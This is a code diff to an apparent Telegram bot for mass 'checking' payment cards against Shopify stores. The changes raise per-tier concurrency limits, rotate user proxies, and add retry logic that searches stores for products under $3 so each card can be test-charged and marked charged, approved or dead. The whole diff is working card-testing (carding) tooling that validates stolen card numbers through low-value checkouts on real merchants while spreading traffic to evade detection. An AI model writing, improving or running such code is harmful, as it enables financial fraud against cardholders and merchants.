@@ -43664,8 +43664,7 @@ async def clear_dead_proxies_command(update: Update, context: ContextTypes.DEFAU
 @check_gateway("autosopi")
 async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
     """
-    ENHANCED Autosopi mass check - ALL ERRORS TREATED AS DECLINED
-    FIXED: Handles None values from BIN lookup properly
+    ENHANCED Autosopi mass check - WITH RETRY FOR NO PRODUCTS UNDER $3
     """
     u_id = update.effective_user.id
     message = update.effective_message
@@ -43701,10 +43700,14 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
         # ============ HIGH SPEED CONCURRENCY SETTINGS ============
         CONCURRENCY = {
             "free": 10,
-            "premium": 30,
-            "ultimate": 100,
-            "admin": 150,
+            "premium": 50,
+            "ultimate": 150,
+            "admin": 200,
         }.get(tier, 80)
+        
+        # ============ RETRY SETTINGS ============
+        MAX_RETRIES = 5  # Maximum retries per card for "No products under $3"
+        RETRY_DELAY = 2  # Seconds between retries
         
         # Get user's working proxies
         user_proxies = []
@@ -43718,6 +43721,7 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
         charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
         dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
         errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
+        retry_emoji = premium_emoji(PREMIUM_EMOJI_IDS["time"], "🔄")
         
         # Create initial progress message
         if progress_msg is None:
@@ -43730,7 +43734,6 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
                 f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
                 f"<b>Dead</b> ➛ 0 {dead_emoji}\n"
                 f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
-                f"<b>Time</b> ➛ 0s"
             )
             progress_msg = await message.reply_text(initial_text, parse_mode=ParseMode.HTML)
         
@@ -43743,8 +43746,12 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
         proxy_rotation_counter = 0
         processed_count = 0
         
+        # ============ TRACK SITES WITH NO PRODUCTS ============
+        sites_with_no_products = set()  # Sites that returned "No products under $3"
+        site_retry_count = {}  # site -> retry count
+        
         async def update_progress(current: int, force: bool = False):
-            """Update progress message - less frequent updates for speed"""
+            """Update progress message"""
             if not force and current > 0 and current < total and current % 20 != 0:
                 return
             
@@ -43758,7 +43765,6 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
             else:
                 status_text = f"PROCESSING {current}/{total}"
             
-            # Calculate cards per second
             cards_per_sec = current / elapsed if elapsed > 0 else 0
             
             progress_text = (
@@ -43770,8 +43776,6 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
                 f"<b>Approved</b> ➛ {stats['approved'] + stats['otp']} {approved_emoji}\n"
                 f"<b>Dead</b> ➛ {stats['declined']} {dead_emoji}\n"
                 f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
-                f"<b>Speed</b> ➛ {cards_per_sec:.1f} cards/sec\n"
-                f"<b>Time</b> ➛ {time_str}"
             )
             
             try:
@@ -43780,17 +43784,95 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
                 if "message is not modified" not in str(e).lower():
                     print(f"⚠️ Progress update error: {e}")
         
+        async def get_working_site_with_retry(card: str, retry_count: int = 0) -> tuple:
+            """
+            Get a working site with retry logic for "No products under $3"
+            Returns: (site, variant_id, price, error_message)
+            """
+            max_retries = MAX_RETRIES
+            tried_sites = set()
+            
+            for attempt in range(max_retries):
+                # Get a site from rotation
+                site = autosopi_site_manager.get_next_site_weighted()
+                
+                if not site:
+                    return None, None, None, "No sites available"
+                
+                # Skip sites we already tried
+                if site in tried_sites:
+                    continue
+                tried_sites.add(site)
+                
+                # Skip sites that failed with "No products under $3" previously
+                if site in sites_with_no_products:
+                    site_retry_count[site] = site_retry_count.get(site, 0) + 1
+                    if site_retry_count[site] < 3:
+                        print(f"⏭️ Skipping site {site} (no products under $3) - retry {site_retry_count[site]}/3")
+                        continue
+                    else:
+                        # Remove from failed set after 3 retries
+                        sites_with_no_products.remove(site)
+                        print(f"🔄 Re-trying site {site} after 3 attempts")
+                
+                # Check site failures
+                site_failures = autosopi_site_manager.site_failures.get(site, 0)
+                if site_failures >= 3:
+                    print(f"⏭️ Skipping dead site: {site} (failures: {site_failures})")
+                    continue
+                
+                # Get variant for this site
+                try:
+                    # Format proxy for API
+                    current_proxy = None
+                    if user_proxies:
+                        current_proxy = user_proxies[proxy_rotation_counter % len(user_proxies)]
+                    
+                    # Fetch products from the site
+                    info = await fetch_products(site, current_proxy)
+                    
+                    if isinstance(info, tuple) and info[0] is False:
+                        error_msg = info[1]
+                        # Check if it's "No products under $3"
+                        if "No products under $3" in error_msg:
+                            print(f"⚠️ Site {site} has no products under $3 - will retry later")
+                            sites_with_no_products.add(site)
+                            site_retry_count[site] = site_retry_count.get(site, 0) + 1
+                            continue
+                        else:
+                            print(f"❌ Site {site} error: {error_msg}")
+                            continue
+                    
+                    # Success! Got a valid product
+                    variant_id = info.get('variant_id')
+                    price = info.get('price', '0.00')
+                    
+                    if variant_id:
+                        print(f"✅ Site {site} has product under $3: ${price}")
+                        return site, variant_id, price, None
+                    
+                except Exception as e:
+                    print(f"❌ Error fetching from {site}: {e}")
+                    continue
+            
+            # All retries exhausted
+            return None, None, None, "No sites with products under $3 after retries"
+        
         async def process_single_card(card: str, idx: int):
-            """Process a single card - NO DELAYS"""
+            """Process a single card with retry logic"""
             nonlocal proxy_rotation_counter, processed_count
             
             async with semaphore:
-                site = autosopi_site_manager.get_next_site_weighted()
-                if not site:
-                    return None
+                # Get a working site with retry
+                site, variant_id, price, error_msg = await get_working_site_with_retry(card)
                 
-                site_failures = autosopi_site_manager.site_failures.get(site, 0)
-                if site_failures >= 3:
+                if not site:
+                    async with results_lock:
+                        stats["declined"] += 1
+                        stats["retries"] += 1
+                        processed_count += 1
+                        if processed_count % 20 == 0 or processed_count == total:
+                            await update_progress(processed_count)
                     return None
                 
                 # Get rotating proxy
@@ -43802,6 +43884,7 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
                 start_time_card = time.time()
                 
                 try:
+                    # Process card with the site
                     result = await shopify_api_pool.check_card_with_pool(card, site, current_proxy, u_id)
                     elapsed = time.time() - start_time_card
                 except Exception as api_error:
@@ -43820,7 +43903,9 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
                     "result": result,
                     "elapsed": elapsed,
                     "proxy_used": current_proxy,
-                    "site_used": site
+                    "site_used": site,
+                    "variant_id": variant_id,
+                    "price": price
                 }
         
         async def send_result_to_user(card_data):
